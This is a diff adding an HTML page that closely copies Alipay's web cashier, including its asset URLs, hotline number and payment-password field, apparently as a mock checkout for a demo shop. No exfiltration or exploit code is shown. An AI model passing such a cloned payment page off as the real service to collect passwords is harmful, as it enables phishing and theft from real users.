@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title> 网上支付 安全快速！</title>
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <!--<link rel="shortcut icon" href="https://i.alipayobjects.com/common/favicon/favicon.ico" type="image/x-icon">-->
+    <!--<link href="https://a.alipayobjects.com/" rel="dns-prefetch">-->
+    <!--<link href="https://app.alipay.com/" rel="dns-prefetch">-->
+    <!--<link href="https://my.alipay.com/" rel="dns-prefetch">-->
+    <!--<link href="https://lab.alipay.com/" rel="dns-prefetch">-->
+    <!--<link href="https://cashier.alipay.com/" rel="dns-prefetch">-->
+    <!--<link href="https://financeprod.alipay.com/" rel="dns-prefetch">-->
+    <!--<link href="https://shenghuo.alipay.com/" rel="dns-prefetch">-->
+
+    <link charset="utf-8" rel="stylesheet" href="./zhifu_files/lightpay.css" media="all">
+    <style>
+        .icon-gray {
+            filter: url("https://cashiereu126.alipay.com:443/filters.svg#grayscale");
+            filter: gray \9;
+            -webkit-filter: grayscale(90%);
+        }
+
+        .mfe-tip-warp {
+            width: 320px;
+        }
+
+        .mfe-tip-title {
+            line-height: 20px;
+        }
+
+        .manage-item .fn-green {
+            color: #393;
+        }
+
+        /* 超限科学引导开始 */
+        .extra-item .ui-button-guide {
+            color: #000;
+            background-color: #fafafa;
+            padding: 0 10px;
+            font-size: 12px;
+            font-weight: normal;
+            margin-top: 6px;
+            margin-bottom: 10px;
+        }
+
+        .extra-item .ui-tipbox-recommend {
+            color: #fff;
+            background-color: #d9524e;
+            padding: 1px 4px 2px 4px;
+            margin-right: 4px;
+            border-radius: 2px;
+        }
+
+        /* 超限科学引导结束 */
+
+
+        /* 账户渠道开始*/
+        .account-chls {
+            margin-bottom: 20px;
+            padding: 0 20px;
+        }
+
+        .account-chl {
+            position: relative;
+            height: 20px;
+            margin-bottom: 1px;
+            padding: 8px 20px 8px 18px;
+        }
+
+        .account-chl-used {
+            background: #E9F0FE;
+        }
+
+        .account-chl-disabled {
+            color: #999;
+        }
+
+        .account-chl .iconfont {
+            font-size: 14px;
+        }
+
+        .account-chl em {
+            font-weight: bold;
+        }
+
+        .account-amount {
+            position: absolute;
+            right: 39px;
+            top: 9px;
+            line-height: 18px;
+        }
+
+        .account-amount em {
+            font-size: 14px;
+            color: #f60;
+            font-weight: 700;
+        }
+
+        /* 购物卡 */
+        .account-card {
+            margin-right: 4px;
+            padding: 2px 4px;
+            border: 1px dashed #bbcbef;
+            background: #fff;
+        }
+
+        .account-card-used {
+            padding: 1px 4px;
+            border: 2px solid #ffac21;
+        }
+
+        .account-card-err {
+            border-color: #f00;
+        }
+
+        .account-card em {
+            font-weight: bold;
+        }
+
+        .account-card i {
+            color: #999;
+        }
+
+        /* 账户渠道结束*/
+
+        .limit-result-off {
+            margin-left: 8px;
+        }
+
+        .limit-result-off {
+            display: none
+        }
+
+        .ch-limiting .icon-limit-exceed {
+            display: inline;
+        }
+
+        .action-rt-gray .limit-result-off {
+            display: none
+        }
+
+        /* 渠道加载 loading */
+        .action-rt {
+            line-height: 14px;
+            height: 14px;
+            font-size: 12px !important;
+            background-color: #FFFFFF !important;
+            border: 1px solid #1E73C1;
+            color: #1E73C1;
+            margin-right: 2px;
+            display: inline-block;
+            zoom: 1;
+        }
+
+        .action-rt .action-rt-type {
+            background-color: #1E73C1;
+            display: inline-block;
+            color: #ffffff;
+            height: 14px;
+            line-height: 14px;
+            padding: 0 2px;
+        }
+
+        .action-rt .rt-discount {
+            color: #1E73C1;
+            padding: 0;
+            background: none;
+        }
+
+        .action-rt-gray .action-rt {
+            border: 0;
+            background-color: #cccccc !important;
+            color: #FFFFFF !important;
+        }
+
+        .action-rt-gray .action-rt-type,
+        .action-rt-gray .rt-discount {
+            background-color: #cccccc !important;
+            color: #FFFFFF !important;
+        }
+
+        .channel-label .ui-fm-error .ui-fm-explain {
+            color: #FF5243;
+            padding: 3px 0 0;
+            padding: 5px 0 0 \9;
+            _padding-top: 3px;
+            _margin-left: 3px;
+            font-size: 12px;
+            padding-left: 20px;
+            background: url(https://i.alipayobjects.com/e/201208/3JRI1gkfUX.png) no-repeat -138px -83px;
+        }
+    </style>
+
+
+    <style type="text/css" class="iconStyle">.banklogo-MONEYFUND_s {
+        background-color: #fff;
+        background-repeat: no-repeat;
+        background-position: 0 0;
+    }
+
+    .banklogo-MONEYFUND_s {
+        background-image: url(https://as.alipayobjects.com/g/cashier-wd/bank-logo/2018.8.31/MONEYFUND_s.png)
+    }
+    </style>
+    <style></style>
+
+    <link charset="utf-8" rel="stylesheet" href="./zhifu_files/index.css">
+    <script src="js/jquery.js"></script>
+</head>
+<body ng-app="zhifu" ng-controller="zhifu_Controller">
+
+<div id="header">
+    <div class="header-container fn-clear">
+        <div class="header-title">
+            <!--<span class="logo">支付宝<s></s></span>-->
+            <span class="logo-title">我的收银台</span>
+        </div>
+        <div class="ui-select fn-left switchTemplate" id="switchTemplate">
+            <a href="#" class="ui-select-text" seed="switchTemplate-link" smartracker="on">
+                <span>中国大陆版</span>
+                <!--<i class="iconfont">&#61500;</i>-->
+            </a>
+        </div>
+        <ul class="header-right">
+            <li class="account-id" style="color: red;font-weight:bold">平台账户：<span id="J-accountId">{{user.name}}</span>
+            </li>
+            <li><a target="_blank" seed="pay-by-standard" href="#">找人代付</a></li>
+            <li>唯一热线：95188</li>
+        </ul>
+    </div>
+</div>
+
+<div id="content">
+    <!-- CMS:收银台cms/快速付款/快付大促主引导tip开始:fastpay/fastpayDacuMaintip.vm -->
+    <!-- CMS:收银台cms/快速付款/快付大促主引导tip结束:fastpay/fastpayDacuMaintip.vm -->
+    <div id="J-payMethod" class="main-container">
+        <div id="J-rcPaymentDisabled"></div>
+
+        <form>
+            <div id="J-rcChannels" data-url="data.html">
+                <div data-reactid=".0">
+                    <ul id="J_MarketinglList" data-reactid=".0.1"></ul>
+                    <ul class="saved-card-list" id="J_SavecardList" data-reactid=".0.2">
+                        <li class="channel-moneyfund row-container fn-clear row-container-focus" data-reactid=".0.2.$0">
+                            <div class="row-basic fn-clear" data-reactid=".0.2.$0.$/=10">
+                                <label class="channel-label" for="moneyfund-0" data-reactid=".0.2.$0.$/=10.0">
+                                <span class="channel-tit channel-icon icon banklogo-MONEYFUND_s" data-id="MONEYFUND_s"
+                                      data-reactid=".0.2.$0.$/=10.0.0">
+                                </span>
+                                    <span class="channel-name" data-reactid=".0.2.$0.$/=10.0.1">账户余额</span>
+                                    <span class="fn-mr-20" data-reactid=".0.2.$0.$/=10.0.2">
+                                    <span class="j-amount" data-reactid=".0.2.$0.$/=10.0.2.0">{{user.money}} 元</span>
+                                    <span class="moneyFund-toggle moneyFund-fastpay" title="隐藏余额宝可支付金额"
+                                          data-reactid=".0.2.$0.$/=10.0.2.1"></span>
+                                </span>
+                                    <span class="pay-amount" data-reactid=".0.2.$0.$/=10.0.8">
+                                    <span class="amount" data-reactid=".0.2.$0.$/=10.0.8.0">
+                                        <span data-reactid=".0.2.$0.$/=10.0.8.0.0">支付</span>
+                                        <em class="amount-font-R16"
+                                            data-reactid=".0.2.$0.$/=10.0.8.0.3">{{totalprice}}</em>
+                                        <span data-reactid=".0.2.$0.$/=10.0.8.0.4"> 元</span>
+                                    </span>
+                                </span>
+                                </label>
+                                <input checked="" class="channel-input" id="moneyfund-0" name="apiCode" type="radio"
+                                       data-reactid=".0.2.$0.$/=10.1" seed="rowBasic-moneyfund0" smartracker="on">
+                            </div>
+                            <div class="row-extra fn-hide" data-reactid=".0.2.$0.$/=11"></div>
+                        </li>
+                    </ul>
+                    <div class="manage-list fn-clear" data-reactid=".0.3">
+                        <a class="manage-item manage-more fn-left" data-seed="lightpay-more-savedCard" href="#"
+                           data-reactid=".0.3.0" seed="manageList-manageItem" smartracker="on">
+                            <span data-reactid=".0.3.0.0">其他付款方式 </span>
+                        </a>
+                        <a class="J_XBox manage-item manage-item-xbox fn-left" data-seed="lightpay-use-newCard" href="#"
+                           data-reactid=".0.3.2" seed="manageList-J_XBox" smartracker="on">
+                            添加快捷/网银付款
+                        </a>
+                    </div>
+                </div>
+            </div>
+
+            <div id="J-security" class="">
+
+                <input type="hidden" name="securityId" id="securityId"
+                       value="web|cashier_payment_3|f20d3c7d-d67a-4efc-8fdd-4543687f5b57RZ48">
+
+                <div class="ui-securitycore ui-securitycore-tip J-securitycoreTip " data-link-in-xbox="">
+
+                    <div class="ui-form-item ui-form-item-success">
+                        <div class="ui-form-explain">安全设置检测成功！无需短信校验。</div>
+                        <div class="J-checkResult fn-hide" data-status="">安全设置检测成功！无需短信校验。</div>
+                    </div>
+
+                </div>
+
+
+                <div class="ui-securitycore J-securitycoreMain"
+                     data-request="web|cashier_payment_3|f20d3c7d-d67a-4efc-8fdd-4543687f5b57RZ48" data-system="cashier"
+                     data-server="#" data-status="" data-extension="false"
+                     data-orderid="10245b1fd7b624363348014536572817">
+
+                    <input style="display:none" seed="JSecuritycoreMain-ipt" smartracker="on">
+                    <input type="password" style="display:none" seed="JSecuritycoreMain-iptT1" smartracker="on">
+
+                    <style type="text/css">
+                        .edit-section .edit-link a {
+                            line-height: 24px;
+                        }
+                    </style>
+
+
+                    <div class="edit-section">
+                        <div class="ui-form-item">
+                            <label class="ui-label">
+                                账户支付密码：
+                            </label>
+
+                            <span class="standardPwdContainer">
+                            <input ng-model="paypassword" type="password" tabindex="1" id="payPassword_input"
+                                   name="payPassword_input" class="ui-input">
+                        </span>
+
+
+                            <span class="ui-form-other edit-link">
+                            <a target="_blank" href="#" seed="sc_edit_forgetPwd">忘记密码？</a>        </span>
+
+                            <div class="ui-form-explain">
+                                <p id="J_edit_prompt_default" class="">
+                                    <!-- CMS:安全核心/安全服务化收银台/未安装控件开始:securitycore/cashier/editPrompt.vm -->
+                                    请输入6位数字支付密码
+                                </p>
+
+                                <p id="J_edit_prompt_noEdit" class="fn-hide">
+                                    <!-- CMS:安全核心/安全服务化收银台/默认的密码控件下方的提示信息开始:securitycore/cashier/editPromptNoEdit.vm -->
+                                    密码控件无法安装？可使用 <a href="javascript:void(0)" class="J-cross-to-mobile"
+                                                    seed="cross-to-mobile-in-cert-tip">穿越到手机上付款</a>
+
+                                </p>
+                            </div>
+
+                        </div>
+                    </div>
+
+
+                    <style type="text/css">
+                        input.sixDigitPassword {
+                            position: absolute;
+                            color: #fff;
+                            opacity: 0;
+                            width: 1px;
+                            height: 1px;
+                            font-size: 1px;
+                            left: 0;
+                            -webkit-box-sizing: content-box;
+                            box-sizing: content-box;
+                            -webkit-user-select: initial; /* 取消禁用选择页面元素 */
+                            outline: 'none';
+                            margin-left: '-9999px';
+                        }
+
+                        div.sixDigitPassword {
+                            cursor: text;
+                            background: #fff;
+                            outline: none;
+                            position: relative;
+                            padding: 8px 0;
+                            height: 14px;
+                            border: 1px solid #cccccc;
+                            border-radius: 2px;
+                        }
+
+                        div.sixDigitPassword i {
+                            float: left;
+                            display: block;
+                            padding: 4px 0;
+                            height: 7px;
+                            border-left: 1px solid #cccccc;
+                        }
+
+                        div.sixDigitPassword i.active {
+                            background-image: url("https://t.alipayobjects.com/images/rmsweb/T1nYJhXalXXXXXXXXX.gif");
+                            background-repeat: no-repeat;
+                            background-position: center center;
+                        }
+
+                        div.sixDigitPassword b {
+                            display: block;
+                            margin: 0 auto;
+                            width: 7px;
+                            height: 7px;
+                            overflow: hidden;
+                            visibility: hidden;
+                            background-image: url("https://t.alipayobjects.com/tfscom/T1sl0fXcBnXXXXXXXX.png");
+                        }
+
+                        div.sixDigitPassword span {
+                            position: absolute;
+                            display: block;
+                            left: 0px;
+                            top: -1px;
+                            height: 30px;
+                            border: 1px solid rgba(82, 168, 236, .8);
+                            border: 1px solid #00ffff \9;
+                            border-radius: 2px;
+                            visibility: hidden;
+                            -webkit-box-shadow: inset 0px 2px 2px rgba(0, 0, 0, 0.75), 0 0 8px rgba(82, 168, 236, 0.6);
+                            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
+                        }
+
+                        .ui-securitycore .ui-form-item-loading .ui-form-explain {
+                            background: url(https://t.alipayobjects.com/tfscom/T1hBFfXnRnXXXXXXXX.gif) 0 4px no-repeat !important;
+                        }
+
+                        .ui-securitycore .ui-form-item-error .ui-form-explain, .ui-securitycore .ui-form-item-warn .ui-form-explain, .ui-securitycore .ui-form-item-success .ui-form-explain, .ui-securitycore .ui-form-item-success .ui-form-text, .ui-securitycore-tip .ui-form-explain {
+                            background-image: url(https://t.alipayobjects.com/tfscom/T1dmlfXc0dXXXXXXXX.png) !important;
+                        }
+
+                        .ui-securitycore .ui-form-item .ui-form-explain {
+                            margin-top: 8px;
+                        }
+
+                    </style>
+
+                </div>
+
+            </div>
+
+            <div id="J-rcSubmit">
+                <div class="ui-fm-item ui-fm-action j-submit" data-reactid=".1">
+                    <input ng-click="fukuan()" class="ui-button ui-button-lblue" id="J_authSubmit" type="button"
+                           value="确认付款">
+                    <!--<span class="ui-fm-status fn-hide" data-reactid=".1.2"> 正在提交中... </span>-->
+                </div>
+            </div>
+        </form>
+    </div>
+
+</div>
+<script src="js/angular.js"></script>
+<script src="js/zhifu.js"></script>
+</body>
+</html>
